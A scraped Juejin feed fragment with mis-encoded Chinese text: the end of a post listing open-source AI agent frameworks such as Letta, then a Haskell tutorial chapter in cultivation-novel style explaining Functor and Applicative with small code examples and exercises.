<p>å¼€å‘è€…å¯ä»¥å°†è‡ªå·±å¼€å‘çš„è‡ªå®šä¹‰å·¥å…·åŒ…ã€æ™ºèƒ½ä½“æ¨¡æ¿å‘å¸ƒåˆ°å¸‚åœºä¸­ä¾›ç¤¾åŒºå¤ç”¨ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€:Â https:<span class="hljs-comment">//github.com/TransformerOptimus/SuperAGI</span>
</code></pre>
<h2 data-id="heading-9">10ã€Letta</h2>
<p>å¤§æ¨¡å‹æœ€è®©äººå¤´ç–¼çš„å°±æ˜¯èŠç€èŠç€å°±å¿˜äº†ï¼ŒLetta æ°å¥½åˆ‡ä¸­äº†è¿™ä¸ªç—›ç‚¹ã€‚</p>
<p>å¦‚æœä½ æƒ³å¼€å‘ä¸€ä¸ªèƒ½é™ªä¼´ç”¨æˆ·å‡ ä¸ªæœˆã€ç”šè‡³å‡ å¹´çš„ä¼´ä¾£å‹åº”ç”¨ï¼Œä¸€å®šè¦çœ‹çœ‹è¿™ä¸ªå¯ä»¥æ„å»ºæœ‰çŠ¶æ€ï¼ˆStatefulï¼‰AI æ™ºèƒ½ä½“çš„å¼€æºæ¡†æ¶ã€‚</p>
<p>å®ƒä¹Ÿæ˜¯è‘—åçš„ MemGPT é¡¹ç›®çš„ç»§ä»»è€…å’Œæ­£å¼åŒ–ç‰ˆæœ¬ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4a7ad46e40c4d8094d699aa43cbc153~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=gqp00QTe%2Bg0p1P2YP7eQHtI6TBk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Letta é€šè¿‡å¼•å…¥ç±»ä¼¼æ“ä½œç³»ç»Ÿçš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼Œè®© AI æ™ºèƒ½ä½“èƒ½å¤Ÿæ‹¥æœ‰æŒä¹…åŒ–çš„é•¿æœŸè®°å¿†ï¼Œå¹¶åœ¨ä¸åŒçš„ä¼šè¯å’Œæ—¶é—´è·¨åº¦ä¸­ä¿æŒä¸€è‡´çš„èº«ä»½å’ŒçŸ¥è¯†ã€‚</p>
<p>Letta å»¶ç»­å¹¶å¼ºåŒ–äº†å¤§æ¨¡å‹å³æ“ä½œç³»ç»Ÿçš„ç†å¿µã€‚</p>
<p>å®ƒé€šè¿‡ä¸€ç§åˆ†å±‚å†…å­˜ç»“æ„ï¼Œå°†ä¿¡æ¯åœ¨å½“å‰ä¸Šä¸‹æ–‡çª—å£å’Œå¤–éƒ¨æ•°æ®åº“ä¹‹é—´åŠ¨æ€è°ƒåº¦ã€‚</p>
<p>æ™ºèƒ½ä½“å…·å¤‡è‡ªæˆ‘ç¼–è¾‘è®°å¿†çš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿè‡ªä¸»å†³å®šä½•æ—¶å°†å…³é”®ä¿¡æ¯å†™å…¥é•¿æœŸå­˜å‚¨æˆ–ä»å†å²è®°å½•ä¸­æ£€ç´¢æ•°æ®ï¼Œä»è€Œåœ¨ä¸å¢åŠ  Token æ¶ˆè€—çš„å‰æä¸‹ï¼Œå®ç°äº†ç†è®ºä¸Šæ— é™çš„ä¸Šä¸‹æ–‡çª—å£ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4632398a2b74efba2f8da148b44fda2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=uk%2BJkMSuypgainGXEEKcwo59ZoQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/letta-ai/letta</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬å…­ç« ï¼šåŒ–ç¥ä¹‹å¢ƒä¸ä¸‡æ³•åŒæº]]></title>    <link>https://juejin.cn/post/7589246131584860195</link>    <guid>https://juejin.cn/post/7589246131584860195</guid>    <pubDate>2025-12-30T02:43:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589246131584860195" data-draft-id="7589186347585355810" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬å…­ç« ï¼šåŒ–ç¥ä¹‹å¢ƒä¸ä¸‡æ³•åŒæº"/> <meta itemprop="keywords" content="Haskell"/> <meta itemprop="datePublished" content="2025-12-30T02:43:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬å…­ç« ï¼šåŒ–ç¥ä¹‹å¢ƒä¸ä¸‡æ³•åŒæº
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:43:00.000Z" title="Tue Dec 30 2025 02:43:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ¬¢è¿é“å‹æ¥åˆ°<strong>ç¬¬å…­ç« </strong>ã€‚</p>
<p>ç»å†äº†ç¬¬äº”ç« â€œå…ƒå©´æœŸâ€Monad å¤©åŠ«çš„æ´—ç¤¼ï¼Œæƒ³å¿…ä½ å·²ç»é¢†æ‚Ÿäº†å¦‚ä½•å¤„ç†é‚£äº›å¸¦ç€â€œå› æœæ°”æ¯â€çš„ç›’å­ã€‚ç„¶è€Œï¼ŒMonad è™½å¼ºï¼Œå´æœ‰æ—¶æ˜¾å¾—è¿‡äºæ²‰é‡â€”â€”æ¯æ¬¡éƒ½è¦â€œæ‰“å¼€ç›’å­ã€å–å‡ºå®è´ã€é‡æ–°è£…ç›’â€ï¼Œæ˜¯å¦è®©ä½ æ„Ÿåˆ°ä¸€ä¸ç¹çï¼Ÿ</p>
<p>ä»Šæ—¥ï¼Œæˆ‘ä»¬å°†æ­¥å…¥<strong>åŒ–ç¥æœŸï¼šä¸‡æ³•é€šè¯†ï¼ˆFunctors &amp; Applicativesï¼‰</strong> ã€‚åœ¨è¿™ä¸€å±‚å¢ƒç•Œï¼Œä½ å°†å­¦ä¼šå¦‚ä½•æ–½å±•â€œéš”ç©ºå–ç‰©â€ä¸â€œå¤šé‡æ³•é˜µâ€çš„ç¥é€šï¼Œä¸å†éœ€è¦æ¯æ¬¡éƒ½äº²æ‰‹æ‹†è§£å› æœã€‚</p>
<hr/>
<p>åœ¨ Î» é—¨çš„é“ç»Ÿä¸­ï¼Œ<strong>Functor (å‡½å­)</strong> ã€<strong>Applicative (åº”ç”¨å‡½å­)</strong> å’Œ <strong>Monad (å•å­)</strong> æ„æˆäº†ä¸€åº§å®Œæ•´çš„ä¿®è¡Œé˜¶æ¢¯ã€‚åŒ–ç¥æœŸçš„æ ¸å¿ƒåœ¨äºï¼š<strong>å¦‚ä½•åœ¨ä¸ç ´åâ€œä¸Šä¸‹æ–‡ï¼ˆContextï¼‰â€çš„æƒ…å†µä¸‹ï¼Œè®©æ³•æœ¯åœ¨ç›’å­å†…éƒ¨æ‚„ç„¶ç”Ÿæ•ˆã€‚</strong></p>
<h3 data-id="heading-0">6.1 éš”ç©ºæ–—æ³•ï¼šFunctorï¼ˆå‡½å­ï¼‰</h3>
<p><strong>Functor</strong> æ˜¯æœ€åŸºç¡€çš„åŒ–ç¥ç¥é€šã€‚å®ƒçš„æ ¸å¿ƒæ³•æœ¯æ˜¯ <code>fmap</code>ï¼ˆæˆ–è€…ç¬¦å· <code>&lt;$&gt;</code>ï¼‰ã€‚</p>
<ul>
<li><strong>å¢ƒç•Œï¼š</strong> å¦‚æœä¸€ä¸ªå®¹å™¨ï¼ˆå¦‚ <code>Maybe</code>, <code>[]</code>, <code>Either</code>ï¼‰æ‹¥æœ‰ Functor ä½æ ¼ï¼Œä½ å°±å¯ä»¥æŠŠä¸€ä¸ª<strong>æ™®é€šæ³•æœ¯</strong>æŠ•å°„åˆ°ç›’å­å†…éƒ¨ã€‚</li>
<li><strong>å¿ƒæ³•ï¼š</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>m</mi><mi>a</mi><mi>p</mi><mo>:</mo><mo>:</mo><mo stretchy="false">(</mo><mi>a</mi><mo>â†’</mo><mi>b</mi><mo stretchy="false">)</mo><mo>â†’</mo><mi>f</mi><mtext>Â </mtext><mi>a</mi><mo>â†’</mo><mi>f</mi><mtext>Â </mtext><mi>b</mi></mrow><annotation encoding="application/x-tex">fmap :: (a \to b) \to f \ a \to f \ b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">ma</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">::</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace">Â </span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace">Â </span><span class="mord mathnormal">b</span></span></span></span></span>ã€‚</li>
<li><strong>ç›´è§‚æ„Ÿå—ï¼š</strong> ä½ ä¸éœ€è¦â€œæ‰“å¼€â€ç›’å­ã€‚ä½ åªéœ€å¯¹ç€ç›’å­æ–½å’’ï¼Œé‡Œé¢çš„ä¸œè¥¿å°±è‡ªåŠ¨è¿›åŒ–äº†ã€‚</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼šéš”å±±æ‰“ç‰›</strong></p>
<p>Haskell</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å‡¡é—´åšæ³•ï¼šç”¨ Pattern Matching æ‹†å¼€ Maybeï¼ŒåŠ  1ï¼Œå†è£…å›å»ï¼ˆç´¯èµ˜ï¼‰</span>
<span class="hljs-comment">-- åŒ–ç¥åšæ³•ï¼šç›´æ¥æŠ•å°„</span>
let <span class="hljs-keyword">result</span> <span class="hljs-operator">=</span> (<span class="hljs-operator">+</span><span class="hljs-number">1</span>) <span class="hljs-operator">&lt;</span>$<span class="hljs-operator">&gt;</span> Just <span class="hljs-number">10</span>  <span class="hljs-comment">-- ç»“æœï¼šJust 11</span>
let void   <span class="hljs-operator">=</span> (<span class="hljs-operator">+</span><span class="hljs-number">1</span>) <span class="hljs-operator">&lt;</span>$<span class="hljs-operator">&gt;</span> Nothing  <span class="hljs-comment">-- ç»“æœï¼šNothingï¼ˆæ³•åŠ›ç©¿é€ï¼Œä¸ç•™ç—•è¿¹ï¼‰</span>
</code></pre>
<hr/>
<h3 data-id="heading-1">6.2 ä¼—çµå½’ä½ï¼šApplicativeï¼ˆåº”ç”¨å‡½å­ï¼‰</h3>
<p>å½“ä½ æŒæ¡äº† <code>fmap</code>ï¼Œä½ ä¼šé‡åˆ°ä¸€ä¸ªæ–°çš„å›°å¢ƒï¼šå¦‚æœ<strong>æ³•æœ¯æœ¬èº«</strong>ä¹Ÿåœ¨ç›’å­é‡Œï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿæˆ–è€…ï¼Œå¦‚æœä½ æƒ³æŠŠä¸€ä¸ªéœ€è¦ä¸¤ä¸ªå‚æ•°çš„æ³•æœ¯ï¼ŒåŒæ—¶ä½œç”¨äºä¸¤ä¸ªç›’å­ä¸Šï¼Ÿ</p>
<p>è¿™æ—¶ï¼Œä½ éœ€è¦ <strong>Applicative</strong> ä½æ ¼ï¼Œä»¥åŠå®ƒçš„æœ¬å‘½æ³•å®ï¼š <strong><code>&lt;*&gt;</code>ï¼ˆé£æ˜Ÿç¬¦ï¼‰</strong> ã€‚</p>
<ul>
<li><strong>å¿ƒæ³•ï¼š</strong> <code>(&lt;*&gt;) :: f (a -&gt; b) -&gt; f a -&gt; f b</code></li>
<li><strong>æ¼”ç»ƒï¼š</strong> å‡è®¾ä½ æœ‰ä¸¤ä¸ªé”¦å›Šï¼Œåˆ†åˆ«è£…ç€çµåŠ›å€¼ï¼Œä½ æƒ³æŠŠå®ƒä»¬åˆè€Œä¸ºä¸€ã€‚</li>
</ul>
<p>Haskell</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- å‡†å¤‡ä¸€ä¸ªä¸¤æ•°ç›¸åŠ çš„æ³•æœ¯ï¼Œå°†å…¶â€œå‡åâ€åˆ°æ³•é˜µä¸­</span>
<span class="hljs-comment">-- pure ä¼šå°†æ™®é€šæ³•æœ¯åŒ…è£¹è¿›å½“å‰ä½æ ¼çš„ç›’å­é‡Œ</span>
pure (+) &lt;*&gt; Just <span class="hljs-number">3</span> &lt;*&gt; Just <span class="hljs-number">5</span>  <span class="hljs-comment">-- ç»“æœï¼šJust 8</span>

<span class="hljs-comment">-- æ›´æœ‰ä»™æ°”çš„å†™æ³•ï¼ˆç»“åˆ fmapï¼‰ï¼š</span>
(+) &lt;$&gt; Just <span class="hljs-number">3</span> &lt;*&gt; Just <span class="hljs-number">5</span>       <span class="hljs-comment">-- ç»“æœï¼šJust 8</span>
</code></pre>
<blockquote>
<p><strong>ç¥æ•ˆï¼š</strong> è¿™ç§å†™æ³•æå…¶ä¼˜é›…ã€‚å®ƒåƒæ˜¯åœ¨å†™æ™®é€šçš„ <code>3 + 5</code>ï¼Œä½†å®é™…ä¸Šå®ƒåœ¨å¤„ç†ä¸¤ä¸ªå¯èƒ½å¤±è´¥ï¼ˆ<code>Maybe</code>ï¼‰æˆ–å…·æœ‰å¤šé‡å› æœï¼ˆ<code>List</code>ï¼‰çš„å˜é‡ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">6.3 å¹»å½±åˆ†èº«ï¼šList çš„ Applicative å±æ€§</h3>
<p>å½“ Applicative ä½œç”¨äºåˆ—è¡¨ <code>[]</code> æ—¶ï¼Œä¼šäº§ç”Ÿä¸€ç§å¥‡å¦™çš„â€œå…¨ç»„åˆâ€æ•ˆæœï¼ŒçŠ¹å¦‚èº«åŒ–åƒä¸‡ã€‚</p>
<p>Haskell</p>
<pre><code class="hljs language-css" lang="css">-- å°†ä¸¤ç§æ”»å‡»æ–¹å¼ä½œç”¨äºä¸‰ä¸ªæ•Œäºº
<span class="hljs-selector-attr">[(+10), (*2)]</span> &lt;*&gt; <span class="hljs-selector-attr">[1, 2, 3]</span>
-- ç»“æœï¼š<span class="hljs-selector-attr">[11, 12, 13, 2, 4, 6]</span>
</code></pre>
<p>æ¯ä¸€ä¸ªå‡½æ•°éƒ½ä¼šä½œç”¨äºæ¯ä¸€ä¸ªå…ƒç´ ï¼Œè¿™ä¾¿æ˜¯**â€œä¸‡æ³•åŒæºï¼Œå¹»å½±éšå¿ƒâ€**ã€‚</p>
<hr/>
<h2 data-id="heading-3">âš¡ åŒ–ç¥å¿ƒå¾—ï¼šä¸‰è€…çš„ç­‰ä½å…³ç³»</h2>
<p>ä¸ºäº†é˜²èŒƒèµ°ç«å…¥é­”ï¼Œé“å‹éœ€ç‰¢è®°è¿™ä¸‰å¤§å¢ƒç•Œçš„é€’è¿›å…³ç³»ï¼š</p>
<ol>
<li><strong>Functor (<code>fmap</code> / <code>&lt;$&gt;</code>):</strong> å°†ä¸€ä¸ªâ€œå‡¡é—´å‡½æ•°â€ä½œç”¨äºâ€œä»™ç•Œç›’å­â€ã€‚</li>
<li><strong>Applicative (<code>&lt;*&gt;</code>):</strong> å°†ä¸€ä¸ªâ€œä»™ç•Œç›’å­é‡Œçš„å‡½æ•°â€ä½œç”¨äºâ€œä»™ç•Œç›’å­é‡Œçš„å€¼â€ã€‚</li>
<li><strong>Monad (<code>&gt;&gt;=</code>):</strong> å°†ä¸€ä¸ªâ€œäº§ç”Ÿä»™ç•Œç›’å­çš„å‡½æ•°â€ä½œç”¨äºâ€œä»™ç•Œç›’å­é‡Œçš„å€¼â€ï¼Œå¹¶èƒ½æ ¹æ®ä¸Šä¸€æ­¥çš„ç»“æœå†³å®šä¸‹ä¸€æ­¥çš„å› æœã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-4">ğŸ“œ åŒ–ç¥è¯•ç‚¼ï¼šç¬¬å…­å…³</h2>
<p>è¯·æ–½å±•ä½ çš„åŒ–ç¥ç¥é€šï¼Œå®Œæˆä»¥ä¸‹æ¨æ¼”ï¼š</p>
<ol>
<li><strong>éš”ç©ºç‚¼è¯ï¼š</strong> ç»™å®šä¸€ä¸ª <code>Just 100</code>ï¼Œè¯·ä½¿ç”¨ <code>&lt;$&gt;</code> å°†å…¶å˜ä¸º <code>Just "Strength: 100"</code>ã€‚</li>
<li><strong>å¤šé‡å…±é¸£ï¼š</strong> å‡è®¾ä½ æœ‰ä¸¤ä¸ªåˆ—è¡¨ <code>l1 = [1, 2]</code> å’Œ <code>l2 = [10, 20]</code>ã€‚è¯·ä½¿ç”¨ Applicative é£æ ¼ï¼ˆ<code>&lt;$&gt;</code> å’Œ <code>&lt;*&gt;</code>ï¼‰ç®—å‡ºè¿™ä¸¤ä¸ªåˆ—è¡¨ä¸­å…ƒç´ ä¸¤ä¸¤ç›¸ä¹˜çš„æ‰€æœ‰ç»“æœã€‚</li>
<li><strong>åæ€ï¼š</strong> ä¸ºä»€ä¹ˆæœ‰äº†å¼ºå¤§çš„ Monadï¼Œæˆ‘ä»¬è¿˜éœ€è¦å­¦ Functor å’Œ Applicativeï¼Ÿï¼ˆæç¤ºï¼šæ€è€ƒâ€œæƒé™â€ä¸â€œç¡®å®šæ€§â€ï¼‰ã€‚</li>
</ol>
<p><strong>â€œå½“ä½ å‘ç°è‡ªå·±ä¸å†é¢‘ç¹ä½¿ç”¨ <code>do</code> è®°æ³•ï¼Œè€Œæ˜¯ç†Ÿç»ƒåœ°ç¥­å‡º <code>&lt;$&gt;</code> ä¸ <code>&lt;*&gt;</code> æ—¶ï¼Œä½ çš„ç¥è¯†å·²ç»å¯ä»¥æ¸¸ç¦»äºå…·ä½“çš„å› æœä¹‹å¤–ï¼ŒçœŸæ­£è§¦ç¢°åˆ°äº†æ³›å‹ç¼–ç¨‹çš„ç²¾é«“ã€‚â€</strong></p>
<hr/>
<p><strong>ä¸‹ä¸€ç« é¢„å‘Šï¼š</strong> åŒ–ç¥åœ†æ»¡åï¼Œä¾¿æ˜¯<strong>ç‚¼è™šæœŸï¼šæƒ°æ€§æ±‚å€¼ä¸æ— ç©·åºåˆ—ï¼ˆLazy Evaluationï¼‰</strong> ã€‚æˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•æ“æ§â€œæ— ç©·â€ï¼Œå¹¶åœ¨æ— é™çš„è™šç©ºä¸­æˆªå–é‚£ä¸€ä¸ç¡®å®šçš„çœŸç†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬ä¸ƒç« ï¼šè™šç©ºé€ ç‰©ä¸æ— å°½çœŸè¨€]]></title>    <link>https://juejin.cn/post/7589246131584876579</link>    <guid>https://juejin.cn/post/7589246131584876579</guid>    <pubDate>2025-12-30T02:43:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589246131584876579" data-draft-id="7589207843787767843" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬ä¸ƒç« ï¼šè™šç©ºé€ ç‰©ä¸æ— å°½çœŸè¨€"/> <meta itemprop="keywords" content="Haskell"/> <meta itemprop="datePublished" content="2025-12-30T02:43:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬ä¸ƒç« ï¼šè™šç©ºé€ ç‰©ä¸æ— å°½çœŸè¨€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:43:58.000Z" title="Tue Dec 30 2025 02:43:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
